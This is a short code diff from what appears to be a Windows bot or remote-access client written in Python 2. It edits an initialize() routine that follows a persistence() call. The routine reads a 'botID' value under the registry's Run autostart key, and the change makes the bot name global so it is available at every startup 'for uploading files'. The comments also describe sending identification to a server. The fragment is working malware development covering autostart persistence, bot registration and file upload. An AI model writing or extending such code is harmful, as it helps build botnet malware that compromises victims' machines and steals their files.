@@ -147,12 +147,13 @@ def identity():
 
 def initialize():
     persistence()
+    global botname
     # create identity only if earlier identity doesn't exist , which is to be checked with registry
     key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                        0, wreg.KEY_QUERY_VALUE)
     # Enumerate the value of bot to determine whether we need to send identification to server or not
     try:
-        bot = wreg.QueryValueEx(key, 'botID')
+        botname = wreg.QueryValueEx(key, 'botID')[0]   # ensures botname to be present at every startup , for uploading files
     except WindowsError:
         print key
         dirpath = identity()
